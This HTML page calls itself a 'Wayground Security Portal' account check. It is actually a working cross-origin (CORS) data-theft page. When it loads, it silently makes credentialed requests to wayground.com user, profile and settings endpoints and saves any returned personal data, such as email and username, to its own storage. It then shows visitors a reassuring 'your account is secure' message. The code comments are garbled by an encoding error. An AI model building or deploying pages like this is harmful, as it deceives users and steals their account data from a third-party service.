<!DOCTYPE html>
<html>
<head>
    <title>Wayground Security Portal</title>
    <style>
        body { font-family: Arial; margin: 40px; background: linear-gradient(135deg, #667eea, #764ba2); color: white; text-align: center; }
        .container { max-width: 600px; margin: 0 auto; background: rgba(255,255,255,0.1); padding: 30px; border-radius: 15px; }
        .loading { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error { color: #ff6b6b; }
        .success { color: #51cf66; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîí Wayground Security Check</h1>
        <p>Verifying your account security...</p>
        <div class="loading"></div>
        <p id="status">Initializing security scanner...</p>
        
        <div id="debug" class="hidden" style="text-align: left; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px; margin: 20px 0;">
            <h4>Debug Info:</h4>
            <div id="debugInfo"></div>
        </div>
        
        <div id="complete" class="hidden">
            <h3 class="success">‚úÖ Security Check Complete</h3>
            <p>Your account is secure. You can now close this page.</p>
        </div>
        
        <div id="error" class="hidden">
            <h3 class="error">‚ùå Security Check Failed</h3>
            <p>Unable to verify account security at this time.</p>
        </div>
    </div>

    <script>
        const endpoints = ['users/me', 'profile', 'settings'];
        let debugInfo = [];
        
        function updateStatus(msg, type = 'info') {
            const status = document.getElementById('status');
            status.textContent = msg;
            status.className = type;
            
            debugInfo.push(`[${new Date().toLocaleTimeString()}] ${msg}`);
            document.getElementById('debugInfo').innerHTML = debugInfo.join('<br>');
        }
        
        function showDebug() {
            document.getElementById('debug').classList.remove('hidden');
        }
        
        async function testCORS() {
            updateStatus('üîç Testing CORS configuration...');
            showDebug();
            
            let anySuccess = false;
            
            for (const endpoint of endpoints) {
                try {
                    updateStatus(`Testing: ${endpoint}`);
                    
                    const response = await fetch(`https://wayground.com/_api/main/${endpoint}`, {
                        method: 'GET',
                        credentials: 'include',
                        headers: {
                            'Accept': 'application/json',
                            'Content-Type': 'application/json'
                        }
                    });
                    
                    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∑–∞–≥–æ–ª–æ–≤–∫–∏ CORS
                    const corsHeader = response.headers.get('access-control-allow-origin');
                    const corsCredentials = response.headers.get('access-control-allow-credentials');
                    
                    updateStatus(`CORS Headers: Origin=${corsHeader}, Credentials=${corsCredentials}`);
                    
                    if (response.ok) {
                        const data = await response.json();
                        updateStatus(`‚úÖ SUCCESS: Got data from ${endpoint}`, 'success');
                        
                        // –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ
                        saveData(endpoint, data);
                        anySuccess = true;
                        
                    } else {
                        updateStatus(`‚ùå HTTP ${response.status} for ${endpoint}`, 'error');
                    }
                    
                } catch (error) {
                    updateStatus(`üí• ERROR: ${endpoint} - ${error.message}`, 'error');
                    console.error('CORS Error:', error);
                }
                
                // –ü–∞—É–∑–∞ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
            if (anySuccess) {
                document.getElementById('complete').classList.remove('hidden');
                updateStatus('üéØ Data collection successful!', 'success');
            } else {
                document.getElementById('error').classList.remove('hidden');
                updateStatus('üö´ No data could be collected', 'error');
            }
        }
        
        function saveData(endpoint, data) {
            // –°–æ–∑–¥–∞–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID –¥–ª—è —ç—Ç–æ–π —Å–µ—Å—Å–∏–∏
            const sessionId = Date.now();
            const storageKey = `cors_data_${sessionId}`;
            
            const dataToSave = {
                endpoint: endpoint,
                data: data,
                timestamp: new Date().toISOString(),
                user: data.email || data.username || 'unknown',
                domain: window.location.hostname
            };
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ localStorage
            localStorage.setItem(storageKey, JSON.stringify(dataToSave));
            updateStatus(`üíæ Saved ${endpoint} data to storage`, 'success');
        }
        
        // –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–µ—Å—Ç
        window.onload = function() {
            setTimeout(testCORS, 1000);
        };
    </script>
</body>
</html>
